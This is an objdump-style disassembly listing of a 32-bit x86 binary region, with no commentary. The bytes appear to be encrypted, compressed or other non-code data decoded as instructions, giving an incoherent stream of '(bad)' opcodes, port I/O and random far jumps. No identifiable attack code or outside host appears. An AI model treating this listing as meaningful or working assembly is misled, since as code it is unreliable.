  415ee8:	add    BYTE PTR [eax],al
  415eea:	add    BYTE PTR [ecx],al
  415eec:	add    BYTE PTR [eax],al
  415eee:	adc    DWORD PTR [ecx-0xf],ebx
  415ef1:	sub    ebp,DWORD PTR ds:0x23e0c2e0
  415ef7:	js     0x415ec3
  415ef9:	xor    cl,BYTE PTR [esi+0x10a64e5a]
  415eff:	push   ebx
  415f00:	xor    si,WORD PTR ds:0xf0ea3cc1
  415f07:	xchg   BYTE PTR [eax+0xf],al
  415f0a:	dec    eax
  415f0b:	jg     0x415ec8
  415f0d:	lods   eax,DWORD PTR ds:[esi]
  415f0e:	jl     0x415ec4
  415f10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f11:	retf   
  415f12:	mul    BYTE PTR [esi]
  415f14:	(bad)  
  415f15:	xor    DWORD PTR [eax+ebx*8],edi
  415f18:	cmovo  edx,DWORD PTR [edi-0x4203ccfb]
  415f1f:	mov    ds:0x80dcfb90,eax
  415f24:	jo     0x415f1b
  415f26:	shl    BYTE PTR [edi],cl
  415f28:	scas   al,BYTE PTR es:[edi]
  415f29:	add    al,0xde
  415f2b:	arpl   WORD PTR es:[esp+ebx*1],si
  415f2f:	movups xmm3,xmm0
  415f32:	dec    esp
  415f33:	ss rcl dl,1
  415f36:	popa   
  415f37:	and    ah,BYTE PTR [esi]
  415f39:	imul   edi,ebp,0x24a7020
  415f3f:	aaa    
  415f40:	test   BYTE PTR [ebx+0x36aec359],ch
  415f46:	mov    ds:0x33f490f5,eax
  415f4b:	leave  
  415f4c:	cmp    ecx,ecx
  415f4e:	sub    al,0x82
  415f50:	jl     0x415fa3
  415f52:	in     eax,dx
  415f53:	out    dx,al
  415f54:	pusha  
  415f55:	gs jo  0x415fd5
  415f58:	xchg   edx,ecx
  415f5a:	stos   BYTE PTR es:[edi],al
  415f5b:	jae    0x415f51
  415f5d:	mov    dh,0xb6
  415f5f:	icebp  
  415f60:	xor    eax,DWORD PTR [edx-0xa]
  415f63:	xor    eax,DWORD PTR [ebx]
  415f65:	inc    ebx
  415f66:	and    BYTE PTR [eax],0x7c
  415f69:	pop    ecx
  415f6a:	cmp    bh,0x57
  415f6d:	mov    dh,0x11
  415f6f:	dec    edx
  415f70:	and    BYTE PTR [ebp+ebp*8-0x1],bl
  415f74:	and    ebx,DWORD PTR [ebx]
  415f76:	mov    esp,0xf466edae
  415f7b:	mov    edi,edx
  415f7d:	leave  
  415f7e:	mov    DWORD PTR [esp+esi*2],edi
  415f81:	loop   0x415f3a
  415f83:	and    esp,esi
  415f85:	adc    dh,BYTE PTR [edx+edi*4]
  415f88:	(bad)  
  415f89:	push   ebp
  415f8a:	jmp    0x415f57
  415f8c:	rcl    BYTE PTR [edi],1
  415f8e:	aas    
  415f8f:	cmp    bh,BYTE PTR [edx-0x6a7c5ccc]
  415f95:	pusha  
  415f96:	in     eax,0xd1
  415f98:	xchg   edx,eax
  415f99:	sub    ebx,DWORD PTR [ebx+0x23]
  415f9c:	mov    ah,0xb2
  415f9e:	fisubr DWORD PTR [edi-0x37a580a]
  415fa4:	jbe    0x416022
  415fa6:	adc    DWORD PTR [edx],0x17493b64
  415fac:	dec    esp
  415fad:	mov    ?,WORD PTR [eax]
  415faf:	pop    eax
  415fb0:	fcomp  QWORD PTR [eax-0x5d7c2941]
  415fb6:	xchg   ebp,eax
  415fb7:	ret    0x82c7
  415fba:	mov    ds:0x9dd4a52e,al
  415fbf:	sub    ebp,DWORD PTR [ebx-0x9]
  415fc2:	ja     0x415f89
  415fc4:	sub    cl,al
  415fc6:	mov    esp,esp
  415fc8:	test   eax,0x7343a66d
  415fcd:	push   es
  415fce:	xor    al,0xf5
  415fd0:	sbb    cl,cl
  415fd2:	jge    0x41604c
  415fd4:	and    al,0x74
  415fd6:	imul   ebp,ebx,0xc048be37
  415fdc:	sbb    al,0xa6
  415fde:	sbb    dl,BYTE PTR [eax+ebp*2]
  415fe1:	test   DWORD PTR [edi+0x39],edx
  415fe4:	cmp    eax,0xac288e99
  415fe9:	pop    esi
  415fea:	add    eax,0x930d30
	...
  416053:	add    BYTE PTR [eax],al
  416055:	add    BYTE PTR [edi],dl
  416057:	mov    BYTE PTR [esi-0x6e],ch
  41605a:	push   esi
  41605c:	dec    DWORD PTR [ebp-0x37ca37e8]
  416062:	cmp    BYTE PTR [edx+0x22],bh
  416065:	pop    ebp
  416066:	addr16 in eax,dx
  416068:	add    BYTE PTR [eax],al
  41606a:	add    BYTE PTR [ecx],al
  41606c:	add    BYTE PTR [eax],al
  41606e:	popa   
  41606f:	pop    ebp
  416070:	sub    al,0x2e
  416072:	rcl    DWORD PTR [ebp-0x2],0x1f
  416076:	test   al,0x33
  416078:	add    cl,BYTE PTR [edx]
  41607a:	sbb    dl,BYTE PTR ds:0xce1359b7
  416080:	adc    cl,bh
  416082:	dec    esi
  416083:	or     esi,edi
  416085:	stos   BYTE PTR es:[edi],al
  416086:	inc    ebx
  416087:	mov    cl,0x0
  416089:	cwde   
  41608a:	mov    edi,0x6d89933b
  41608f:	lods   al,BYTE PTR ds:[esi]
  416090:	into   
  416091:	jb     0x416074
  416093:	popf   
  416094:	mov    dh,0x6c
  416096:	mov    ch,0x23
  416098:	push   eax
  416099:	jb     0x416070
  41609b:	test   eax,0xa3205881
  4160a0:	mov    ebx,0x58aaa5ee
  4160a5:	xchg   ebp,eax
  4160a6:	dec    eax
  4160a7:	lods   al,BYTE PTR ds:[esi]
  4160a8:	xor    eax,0x17e16c47
  4160ad:	adc    al,0x6
  4160af:	test   al,0x8f
  4160b1:	xor    edx,DWORD PTR [esi-0x5859af39]
  4160b7:	inc    edx
  4160b8:	popf   
  4160b9:	push   eax
  4160ba:	(bad)  
  4160bb:	shl    BYTE PTR [edx-0x3a],0xbe
  4160bf:	fcmovnu st,st(4)
  4160c1:	nop
  4160c2:	sub    DWORD PTR [ecx+edi*4-0x5f],esp
  4160c6:	adc    ebp,DWORD PTR [eax-0x3ccda0d9]
  4160cc:	stos   BYTE PTR es:[edi],al
  4160cd:	lea    esp,[ecx-0x6e38e069]
  4160d3:	test   al,0xfa
  4160d5:	and    eax,0x44916e3d
  4160da:	imul   esi,DWORD PTR ds:0xd6d82793,0xffffffa2
  4160e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160e2:	sub    al,BYTE PTR [esi]
  4160e4:	call   0x114bcabf
  4160e9:	and    al,BYTE PTR [eax+0x1add177]
  4160ef:	cli    
  4160f0:	mov    esi,0x698904e1
  4160f5:	cdq    
  4160f6:	and    DWORD PTR [eax],ecx
  4160f8:	pop    esp
  4160f9:	jge    0x4160bc
  4160fb:	add    al,0xbd
  4160fd:	inc    eax
  4160fe:	mov    dl,BYTE PTR [ebx+0x3f53773b]
  416104:	lahf   
  416105:	lahf   
  416106:	out    dx,al
  416107:	jae    0x41611e
  416109:	push   ebp
  41610a:	fld    TBYTE PTR [esi+0x57]
  41610d:	(bad)  
  41610e:	nop
  41610f:	adc    BYTE PTR [ebx],bh
  416111:	aad    0x33
  416113:	mov    esi,0x17068962
  416118:	pop    edi
  416119:	(bad)  
  41611a:	icebp  
  41611b:	es ret 
  41611d:	imul   esp,esi,0xd
  416120:	cmp    ebp,esi
  416122:	lods   eax,DWORD PTR ds:[esi]
  416123:	int3   
  416124:	into   
  416125:	fsub   st(0),st
  416127:	sbb    bh,ch
  416129:	in     ax,0x49
  41612c:	xchg   ecx,eax
  41612d:	xor    DWORD PTR [edi],esi
  41612f:	pop    edi
  416130:	mov    esi,0x822ac7f1
  416135:	sub    al,0x30
  416137:	(bad)  
  416138:	xchg   esp,esi
  41613a:	push   0xffffffca
  41613c:	or     esi,ebx
  41613e:	inc    eax
  41613f:	inc    edi
  416140:	cwde   
  416141:	popf   
  416142:	mov    WORD PTR [esi+0x13],?
  416145:	fstp   TBYTE PTR [ebx-0x60]
  416148:	clc    
  416149:	add    DWORD PTR [edi-0x13587f21],edx
  41614f:	out    dx,eax
  416150:	jbe    0x4161b1
  416152:	adc    dh,BYTE PTR [ebx]
  416154:	pop    esi
  416155:	mov    DWORD PTR [ecx+0x3fd04c7e],ecx
  41615b:	icebp  
  41615c:	in     eax,0x3f
  41615e:	repnz mov bl,0x48
  416161:	or     eax,0x373342fc
  416166:	int    0x19
  416168:	and    eax,0x5a45e16c
  41616d:	inc    ebx
	...
  4161d6:	and    cl,ch
  4161d8:	cmp    ebx,esi
  4161da:	sti    
  4161db:	fsubrp st(5),st
  4161dd:	inc    esi
  4161df:	push   edx
  4161e0:	sub    eax,0x838548f3
  4161e5:	in     al,0x67
  4161e7:	out    dx,al
  4161e8:	add    BYTE PTR [eax],al
  4161ea:	add    BYTE PTR [ecx],al
  4161ec:	add    BYTE PTR [eax],al
  4161ee:	add    DWORD PTR [esi],ecx
  4161f0:	push   0x10479406
  4161f5:	xor    BYTE PTR [ecx+0x7a785a08],al
  4161fb:	adc    al,al
  4161fd:	mov    ah,0xfa
  4161ff:	push   0xd2631aa5
  416204:	adc    BYTE PTR [ecx],dh
  416206:	and    BYTE PTR [edx-0x25f9800c],dh
  41620c:	(bad)  
  41620d:	push   edx
  41620e:	push   esi
  41620f:	push   eax
  416210:	sub    esp,eax
  416212:	int    0xe7
  416214:	js     0x4161ce
  416216:	call   0x48e64100
  41621b:	fstp   QWORD PTR [edi+esi*1+0x36]
  41621f:	pop    ss
  416220:	mov    dl,0xd8
  416222:	mov    edi,0x6d869345
  416227:	pop    ebp
  416228:	jne    0x4161ff
  41622a:	mov    ch,0xcc
  41622c:	fidivr WORD PTR [edx+ecx*8-0x1c]
  416230:	fisub  WORD PTR [esp+ecx*8-0x64d260b9]
  416237:	fcmovne st,st(5)
  416239:	add    ebp,DWORD PTR ds:0xfedb2bd3
  41623f:	and    DWORD PTR ds:0xcb34368e,0xfa84e7fc
  416249:	and    BYTE PTR [ecx+esi*8],ah
  41624c:	enter  0xd811,0x37
  416250:	into   
  416251:	fistp  WORD PTR [eax]
  416253:	call   0x3d68edf1
  416258:	xchg   BYTE PTR [edi+eax*2+0x5e3d77ee],cl
  41625f:	icebp  
  416260:	push   0xffffffe5
  416262:	mov    DWORD PTR ds:0x67e806e9,esi
  416268:	ss into 
  41626a:	cld    
  41626b:	add    BYTE PTR [ebp+0xb],0x60
  41626f:	pop    edi
  416270:	mov    ebx,0xf268a17e
  416275:	scas   al,BYTE PTR es:[edi]
  416276:	(bad)  
  416277:	xchg   esp,eax
  416278:	cli    
  416279:	cmp    eax,DWORD PTR [ebx]
  41627b:	shl    BYTE PTR [ecx-0x50],1
  41627e:	daa    
  41627f:	and    bl,BYTE PTR [edi+0x5d3233b7]
  416285:	cdq    
  416286:	pop    esi
  416287:	(bad)  
  416288:	lock leave 
  41628a:	popf   
  41628b:	or     esi,ebp
  41628d:	sqrtps xmm3,XMMWORD PTR [ecx-0x66ac9bc1]
  416294:	xor    al,0x27
  416296:	push   ebp
  416297:	call   0x181b:0xd9b35423
  41629e:	(bad)  
  41629f:	scas   al,BYTE PTR es:[edi]
  4162a0:	push   edx
  4162a1:	outs   dx,DWORD PTR ds:[esi]
  4162a2:	mov    ch,0xb
  4162a4:	mov    DWORD PTR [esi-0x35],ebx
  4162a7:	add    ah,BYTE PTR [ebx+ecx*4]
  4162aa:	frstor [edi-0x34]
  4162ad:	outs   dx,DWORD PTR ds:[esi]
  4162ae:	pop    ebp
  4162af:	stos   BYTE PTR es:[edi],al
  4162b0:	or     al,0x45
  4162b2:	cld    
  4162b3:	or     dl,dl
  4162b5:	outs   dx,DWORD PTR ds:[esi]
  4162b6:	inc    edi
  4162b7:	cwde   
  4162b8:	scas   eax,DWORD PTR es:[edi]
  4162b9:	cmp    eax,0x703d6b85
  4162be:	dec    edx
  4162bf:	das    
  4162c0:	jl     0x4162fa
  4162c2:	adc    eax,0xd44b513c
  4162c7:	fwait
  4162c8:	mov    WORD PTR [ecx],ds
  4162ca:	aas    
  4162cb:	iret   
  4162cc:	dec    esi
  4162cd:	and    BYTE PTR [ebx],al
  4162cf:	jb     0x4162f5
  4162d1:	push   esp
  4162d2:	shr    DWORD PTR [ecx-0x7cb6852e],1
  4162d8:	lods   al,BYTE PTR ds:[esi]
  4162d9:	add    eax,0x41c2ce22
  4162de:	(bad)  
  4162df:	es cwde 
  4162e1:	add    cl,bh
  4162e3:	push   es
  4162e4:	sti    
  4162e5:	cmp    ch,al
  4162e7:	jp     0x416312
  4162e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162ea:	sbb    BYTE PTR [eax],bh
  4162ec:	mov    ds:0x52,eax
	...
  416355:	add    BYTE PTR [ebx],ah
  416357:	outs   dx,BYTE PTR ds:[esi]
  416358:	xor    ah,BYTE PTR ds:0x6e377d7f
  41635e:	mov    bl,0x5f
  416360:	call   0x6749:0xa358fbee
  416367:	out    dx,eax
  416368:	add    BYTE PTR [eax],al
  41636a:	add    BYTE PTR [ecx],al
  41636c:	add    BYTE PTR [eax],al
  41636e:	inc    esi
  41636f:	mov    ecx,0x3a7d809d
  416374:	test   al,0x4b
  416376:	dec    ebx
  416377:	test   BYTE PTR [ebp+0x42583aec],ah
  41637d:	call   0xb992:0x56106108
  416384:	sub    DWORD PTR [edi+edi*2],ebx
  416387:	push   edx
  416388:	mov    edi,0xca0a9404
  41638d:	xchg   esp,eax
  41638e:	loop   0x4163f7
  416390:	ins    BYTE PTR es:[edi],dx
  416391:	frstor [edx-0x1e]
  416394:	arpl   WORD PTR [eax],si
  416396:	scas   eax,DWORD PTR es:[edi]
  416397:	into   
  416398:	jb     0x41632b
  41639a:	retf   
  41639b:	(bad)  [edi+edi*8]
  41639e:	popf   
  41639f:	jge    0x416376
  4163a1:	mov    bl,0x93
  4163a3:	pop    eax
  4163a4:	ins    DWORD PTR es:[edi],dx
  4163a5:	sbb    eax,0xc44c1605
  4163aa:	sbb    DWORD PTR ds:[ebx-0x3ee9d360],esi
  4163b1:	inc    esp
  4163b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163b3:	or     BYTE PTR [esi+edx*2-0x79fcf98d],bl
  4163ba:	scas   eax,DWORD PTR es:[edi]
  4163bb:	cdq    
  4163bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163bd:	xor    edi,edi
  4163bf:	(bad)  
  4163c0:	push   ds
  4163c1:	adc    esp,edi
  4163c3:	dec    esp
  4163c4:	std    
  4163c5:	cmp    DWORD PTR [ebp-0x15b4d82b],edi
  4163cb:	or     eax,0x950e4a3
  4163d0:	sti    
  4163d1:	test   eax,0x2bc4a4d1
  4163d6:	mov    dh,0x1
  4163d8:	outs   dx,BYTE PTR ds:[esi]
  4163d9:	scas   al,BYTE PTR es:[edi]
  4163da:	scas   al,BYTE PTR es:[edi]
  4163db:	lahf   
  4163dc:	and    ebx,DWORD PTR ds:0xac91aa1a
  4163e2:	ins    BYTE PTR es:[edi],dx
  4163e3:	push   edi
  4163e4:	jmp    0x619e:0x69af51b5
  4163eb:	mov    bl,0x16
  4163ed:	call   0xb266:0x3bf5c490
  4163f4:	lahf   
  4163f5:	jae    0x416438
  4163f7:	sub    eax,0x96d5c0a6
  4163fc:	std    
  4163fd:	shr    BYTE PTR [esi+0x58d1d8aa],cl
  416403:	(bad)  
  416404:	xchg   esi,esp
  416406:	rcl    DWORD PTR [ebx],0xb6
  416409:	test   eax,0x7c34168d
  41640e:	inc    esp
  41640f:	stc    
  416410:	in     al,0xb
  416412:	bound  edx,QWORD PTR [esi-0xc]
  416415:	jae    0x416447
  416417:	js     0x4163cc
  416419:	dec    ecx
  41641a:	or     BYTE PTR [eax-0x2a73648e],dl
  416420:	vpxor  ymm1,ymm7,ymm6
  416424:	rcl    DWORD PTR [eax+0x3c],1
  416427:	cmp    bl,BYTE PTR [eax-0x4c]
  41642a:	or     DWORD PTR [eax],0xffffffff
  41642d:	fisttp DWORD PTR [ecx-0x5bfd874c]
  416433:	pop    ds
  416434:	inc    edi
  416435:	ds jecxz 0x41649a
  416438:	fsub   DWORD PTR [esi-0xc]
  41643b:	dec    edi
  41643c:	mov    eax,ds:0xcee7d509
  416441:	mov    BYTE PTR [ebp-0x16],bh
  416444:	lds    ebp,FWORD PTR [esp+ecx*2-0x44aa641c]
  41644b:	je     0x41641a
  41644d:	mov    fs,WORD PTR [ecx-0x4d]
  416450:	add    eax,0x27f6e80e
  416455:	jl     0x4164b8
  416457:	stos   BYTE PTR es:[edi],al
  416458:	test   BYTE PTR [eax-0x78],dl
  41645b:	mov    ds:0x480cb7dc,al
  416460:	push   0x30
  416462:	inc    eax
  416463:	or     BYTE PTR [edx+0x2e],al
  416466:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416467:	push   esi
  416468:	sti    
  416469:	pop    edx
  41646a:	stos   BYTE PTR es:[edi],al
  41646b:	sbb    al,BYTE PTR [esi]
  41646d:	adc    al,BYTE PTR [eax]
	...
  4164d3:	add    BYTE PTR [eax],al
  4164d5:	add    bl,dh
  4164d7:	inc    ebx
  4164d8:	ror    cl,1
  4164da:	lock (bad) 
  4164dd:	jnp    0x41646d
  4164df:	xor    al,0x5a
  4164e1:	xchg   esi,eax
  4164e2:	xor    DWORD PTR [ebx],edx
  4164e4:	addr16 cld 
  4164e6:	lock add BYTE PTR [bx+si],al
  4164ea:	add    BYTE PTR [ecx],al
  4164ec:	add    BYTE PTR [eax],al
  4164ee:	or     ah,ah
  4164f0:	dec    ebp
  4164f1:	add    al,0xf9
  4164f3:	add    ebx,DWORD PTR [ecx+ebx*8+0x49]
  4164f7:	pop    ebp
  4164f8:	(bad)  
  4164f9:	in     al,dx
  4164fa:	xchg   esp,eax
  4164fb:	xor    edi,DWORD PTR [esi+edi*2]
  4164fe:	inc    esp
  4164ff:	adc    ecx,0x3
  416502:	pop    ebp
  416503:	xor    dl,BYTE PTR [esi+eax*8+0x41e633a9]
  41650a:	into   
  41650b:	xchg   edi,eax
  41650c:	out    0xe2,al
  41650e:	mov    ch,BYTE PTR [edi]
  416510:	pop    edi
  416511:	js     0x4164c3
  416513:	push   edi
  416514:	sbb    al,0xd1
  416516:	es aas 
  416518:	sbb    DWORD PTR [edx+0x45],ebx
  41651b:	icebp  
  41651c:	sub    eax,0x88b8e716
  416521:	push   0x44a90cf2
  416526:	pusha  
  416527:	jno    0x416579
  416529:	sar    DWORD PTR [ebx+edx*2],1
  41652c:	add    dl,BYTE PTR [edx]
  41652e:	addr16 sbb edi,edi
  416531:	and    cl,BYTE PTR [ebp-0x27]
  416534:	push   edx
  416535:	pop    esi
  416536:	rcl    BYTE PTR [esi+0x5],cl
  416539:	imul   ebx,DWORD PTR [esi+0x611d82ac],0x56
  416540:	mov    bl,0x1d
  416542:	stos   DWORD PTR es:[edi],eax
  416543:	clc    
  416544:	sub    ebx,edi
  416546:	mov    edi,0xd0f83010
  41654b:	mov    ds:0x43762905,eax
  416550:	adc    eax,DWORD PTR [edi+0x60]
  416553:	and    BYTE PTR [esi-0x26],dl
  416556:	pop    esi
  416557:	outs   dx,BYTE PTR ds:[esi]
  416558:	das    
  416559:	rcr    BYTE PTR [ebx-0x42938b91],0x1e
  416560:	jl     0x416575
  416562:	jmp    0xc02d:0x2216712b
  416569:	mov    ?,WORD PTR [ebx]
  41656b:	push   0x6fbbe226
  416570:	xchg   ebp,eax
  416571:	in     al,0x20
  416573:	ficomp WORD PTR [esi]
  416575:	cmp    eax,0xf36e7d00
  41657a:	sub    al,0x1a
  41657c:	imul   edi,DWORD PTR [ebp-0x65ef6d5d],0x67
  416583:	in     al,dx
  416584:	out    0x75,al
  416586:	gs cs adc al,0x2d
  41658a:	or     ecx,DWORD PTR [edx]
  41658c:	lock sbb edx,DWORD PTR [edx]
  41658f:	cmp    DWORD PTR [esi-0x26f7492d],ecx
  416595:	inc    ebp
  416596:	repz xchg esp,eax
  416598:	push   ebp
  416599:	js     0x4165e7
  41659b:	mov    ds,WORD PTR [ebx+0x7d]
  41659e:	xchg   ebp,eax
  41659f:	out    0x4f,al
  4165a1:	(bad)  
  4165a2:	fdiv   QWORD PTR [ecx-0x55a2ac00]
  4165a8:	dec    esi
  4165a9:	mov    edi,cs
  4165ab:	jnp    0x4165d8
  4165ad:	test   eax,0x6182f055
  4165b2:	inc    ebx
  4165b3:	je     0x416601
  4165b5:	aam    0x19
  4165b7:	in     eax,dx
  4165b8:	fcomp  DWORD PTR [ebx+esi*2-0x2a]
  4165bc:	repz pop ds
  4165be:	add    eax,0x9cbec26f
  4165c3:	pop    edi
  4165c4:	push   cs
  4165c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165c6:	add    al,0x66
  4165c8:	mov    BYTE PTR [esi+ecx*8+0x2a],al
  4165cc:	xor    ah,BYTE PTR [ecx]
  4165ce:	cmp    bl,BYTE PTR [esi+0x42]
  4165d1:	imul   ebp,DWORD PTR [edx+0x7fefcb4],0x65
  4165d8:	test   DWORD PTR [edx+0x4cb34bbe],esi
  4165de:	nop
  4165df:	cmp    dh,BYTE PTR [edi+edx*2+0x7f715173]
  4165e6:	cmp    DWORD PTR [esi-0x48],ecx
  4165e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165eb:	push   ss
  4165ec:	ret    
  4165ed:	iret   
	...
  416656:	and    eax,0xfff32bd8
  41665b:	repz std 
  41665d:	fisub  WORD PTR [esi+0x684fbcac]
  416663:	mov    cs,WORD PTR [ebx]
  416665:	inc    edx
  416666:	addr16 icebp 
  416668:	add    BYTE PTR [eax],al
  41666a:	add    BYTE PTR [ecx],al
  41666c:	add    BYTE PTR [eax],al
  41666e:	inc    edi
  41666f:	ret    0x3e56
  416672:	mov    bh,0xff
  416674:	mov    esi,0xba24611
  416679:	mov    ds:0xed3e25ad,al
  41667e:	cmc    
  41667f:	and    DWORD PTR [ecx-0x63],0x6f
  416683:	push   0xb0638464
  416688:	and    cl,cl
  41668a:	inc    ebx
  41668b:	in     al,dx
  41668c:	cld    
  41668d:	int    0xbf
  41668f:	sbb    dh,0x3
  416692:	inc    edi
  416693:	repz push eax
  416695:	(bad)  
  416696:	daa    
  416697:	loop   0x416668
  416699:	hlt    
  41669a:	mov    edx,0xe311908
  41669f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166a0:	les    edx,FWORD PTR ds:0xf314fc06
  4166a6:	jmp    FWORD PTR [ebx+0x57ad61cf]
  4166ac:	sbb    al,ch
  4166ae:	add    al,0x9e
  4166b0:	shufps xmm5,XMMWORD PTR [ebx+0x71],0xef
  4166b5:	sbb    BYTE PTR [edx-0x4f],0x46
  4166b9:	std    
  4166ba:	sub    ch,BYTE PTR [esi-0x57]
  4166bd:	jae    0x4166f7
  4166bf:	pushf  
  4166c0:	or     BYTE PTR [esi+0x6c2b8d55],0xb2
  4166c7:	push   esi
  4166c8:	fistp  DWORD PTR [esi]
  4166ca:	ficomp DWORD PTR [edx-0x75]
  4166cd:	or     al,al
  4166cf:	pop    ecx
  4166d0:	pop    ecx
  4166d1:	mov    cs,WORD PTR [esp+eiz*4+0x42]
  4166d5:	add    al,0xdc
  4166d7:	call   0x6d77:0xb63c6a39
  4166de:	stos   BYTE PTR es:[edi],al
  4166df:	fdiv   QWORD PTR [ecx+0x37]
  4166e2:	in     al,dx
  4166e3:	fsub   QWORD PTR [edx+0x46]
  4166e6:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4166e8:	mov    al,0xeb
  4166ea:	cwde   
  4166eb:	and    eax,0xc4340a84
  4166f0:	mov    edi,0x39819bc7
  4166f5:	mov    ebp,0xb8e72c84
  4166fa:	in     al,dx
  4166fb:	push   cs
  4166fc:	(bad)  
  4166fd:	cmp    DWORD PTR [ecx+0x1],eax
  416700:	dec    eax
  416701:	(bad)  
  416702:	jns    0x416724
  416704:	icebp  
  416705:	popf   
  416706:	daa    
  416707:	push   edx
  416708:	stos   DWORD PTR es:[edi],eax
  416709:	(bad)  
  41670a:	mov    bl,0xaa
  41670c:	push   eax
  41670d:	and    DWORD PTR [esi-0x41],ebp
  416710:	sub    al,BYTE PTR [ecx]
  416712:	cmp    BYTE PTR gs:[ecx],ah
  416715:	cwde   
  416716:	mov    ah,0x3
  416718:	adc    eax,0x7f31900e
  41671d:	stos   DWORD PTR es:[edi],eax
  41671e:	sub    edx,DWORD PTR [ecx]
  416720:	pop    ss
  416721:	xchg   esi,eax
  416722:	or     BYTE PTR [ebx],ch
  416724:	sti    
  416725:	pop    ecx
  416726:	cmc    
  416727:	pop    es
  416728:	add    ebx,edi
  41672a:	sub    esp,ecx
  41672c:	pop    es
  41672d:	imul   ebx,esi,0xffffffab
  416730:	jae    0x4166ec
  416732:	into   
  416733:	std    
  416734:	ds push ebp
  416736:	inc    edi
  416737:	and    bh,BYTE PTR [edi]
  416739:	push   edi
  41673a:	xchg   ecx,eax
  41673b:	cmp    DWORD PTR [edx+0x69a7ea14],ecx
  416741:	jnp    0x4166c3
  416743:	imul   ebx,esp,0xaf1a569c
  416749:	and    BYTE PTR [edi+edi*2-0x20],ch
  41674d:	mov    ah,BYTE PTR [ecx+0x27]
  416750:	adc    al,0xc1
  416752:	jnp    0x416768
  416754:	lods   eax,DWORD PTR ds:[esi]
  416755:	fstp   DWORD PTR [esi-0x598a8200]
  41675b:	xchg   bl,bl
  41675d:	dec    ebx
  41675e:	adc    dh,BYTE PTR [edi+0x44]
  416761:	or     BYTE PTR [esi+ebp*1-0x85847f6],bl
  416768:	popf   
  416769:	or     BYTE PTR [edx],0x40
  41676c:	(bad)  
  41676d:	rol    BYTE PTR [eax],1
	...
  4167d3:	add    BYTE PTR [eax],al
  4167d5:	add    ah,al
  4167d7:	(bad)  
  4167d9:	(bad)  
  4167da:	(bad)  
  4167dc:	out    0xff,eax
  4167de:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  4167e2:	adc    dh,al
  4167e4:	(bad)  
  4167e5:	lods   al,BYTE PTR ds:[esi]
  4167e6:	repnz add BYTE PTR [bx+si],al
  4167ea:	add    BYTE PTR [ecx],al
  4167ec:	add    BYTE PTR [eax],al
  4167ee:	shl    BYTE PTR [ebx],0x14
  4167f1:	addr16 pop eax
  4167f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167f4:	les    edi,FWORD PTR [eax+ecx*4+0x67]
  4167f8:	sbb    al,0x34
  4167fa:	dec    edx
  4167fb:	in     eax,0x4c
  4167fd:	leave  
  4167fe:	cdq    
  4167ff:	dec    esi
  416800:	clc    
  416801:	jns    0x4167ec
  416803:	xchg   DWORD PTR [ecx-0x8],ebx
  416806:	cmovl  eax,DWORD PTR [eax]
  416809:	xchg   edx,eax
  41680a:	pop    esi
  41680b:	repz adc eax,DWORD PTR [esi-0x4]
  41680f:	sub    eax,0xdad9f9ee
  416814:	xor    BYTE PTR [esi-0x527ac325],ah
  41681a:	iret   
  41681b:	xchg   edx,eax
  41681c:	sub    al,BYTE PTR [edi]
  41681e:	jge    0x416869
  416820:	pop    es
  416821:	and    DWORD PTR [ebp+0x7a],esp
  416824:	scas   eax,DWORD PTR es:[edi]
  416825:	mov    dl,0x8d
  416827:	xor    BYTE PTR [edi+0x5ab66725],ch
  41682d:	fsubr  DWORD PTR [ebp-0x41]
  416830:	and    DWORD PTR ds:0x7037c229,esp
  416836:	pusha  
  416837:	dec    ebx
  416838:	arpl   WORD PTR [eax-0x56],bp
  41683b:	xchg   edx,eax
  41683c:	xor    eax,0x308213b3
  416841:	(bad)
  416844:	jp     0x416884
  416846:	mov    edx,0xe9259633
  41684b:	xor    DWORD PTR [eax+0x7346ce3c],esp
  416851:	fwait
  416852:	clc    
  416853:	sar    dh,cl
  416855:	mov    eax,0xb6ab232c
  41685a:	out    dx,eax
  41685b:	std    
  41685c:	js     0x41688f
  41685e:	adc    DWORD PTR [ebp-0x65],edi
  416861:	mov    eax,0xb8de3d2f
  416866:	add    al,0xe5
  416868:	fild   QWORD PTR [ecx]
  41686a:	(bad)
  41686d:	lods   al,BYTE PTR ds:[esi]
  41686e:	leave  
  41686f:	ja     0x416831
  416871:	sbb    dh,BYTE PTR [ebx+0x28c6c804]
  416877:	jl     0x41680a
  416879:	mov    BYTE PTR ds:0xaf4b6ba,dh
  41687f:	mov    ds:0x5b59ef8a,al
  416884:	push   0xc990c52f
  416889:	jle    0x4168c3
  41688b:	lahf   
  41688c:	dec    ebp
  41688d:	lods   eax,DWORD PTR ds:[esi]
  41688e:	invd   
  416890:	jnp    0x4168e5
  416892:	lods   al,BYTE PTR ds:[esi]
  416893:	xchg   edi,eax
  416894:	fwait
  416895:	sbb    DWORD PTR [ebx-0x6f],0xfffffff5
  416899:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41689a:	pop    esi
  41689b:	push   eax
  41689c:	enter  0xc2a1,0x10
  4168a0:	dec    esp
  4168a1:	ja     0x416876
  4168a3:	into   
  4168a4:	and    BYTE PTR [esi],bh
  4168a6:	pushf  
  4168a7:	fdiv   QWORD PTR [ebx]
  4168a9:	lods   al,BYTE PTR ds:[esi]
  4168aa:	cmc    
  4168ab:	repnz or al,0xe1
  4168ae:	mov    WORD PTR [edi+0x5face9ee],ss
  4168b4:	push   esp
  4168b5:	pop    edi
  4168b6:	jae    0x4168b4
  4168b8:	(bad)  
  4168b9:	in     eax,dx
  4168ba:	cmp    BYTE PTR [edi+0x6d],dl
  4168bd:	or     eax,0x6bb76581
  4168c2:	xor    BYTE PTR gs:[edi],cl
  4168c5:	xchg   ebp,eax
  4168c6:	cdq    
  4168c7:	(bad)  
  4168c8:	(bad)  
  4168c9:	add    ch,BYTE PTR [ecx+0x7d]
  4168cc:	jmp    0xd232:0x260b6af5
  4168d3:	ja     0x416907
  4168d5:	pushf  
